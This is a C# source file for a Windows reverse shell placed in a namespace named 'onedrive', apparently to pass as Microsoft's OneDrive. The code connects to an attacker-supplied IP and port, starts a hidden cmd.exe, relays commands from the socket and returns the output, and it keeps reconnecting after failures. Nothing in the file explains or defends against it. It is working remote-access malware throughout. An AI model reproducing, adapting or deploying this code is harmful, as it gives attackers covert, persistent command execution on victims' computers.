using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace onedrive
{
    public class Program
    {
        static StreamWriter streamWriter;
        static TcpClient client;
        static string ip = "127.0.0.1";
        static int port = 4444;
        public static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                ip = args[0];
                port = int.Parse(args[1]);
                Start();
            }
        }
        private static void Initialize()
        {
            try
            {
                client = new TcpClient(ip, port);
            }
            catch (Exception ex)
            {
                Thread.Sleep(10000);
                Initialize();
            }
        }
        private static void Start()
        {
            Initialize();
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while (true)
                    {
                        try
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                        catch (Exception)
                        {
                            Start();
                            break;
                        }
                    }
                }
            }

        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

    }
}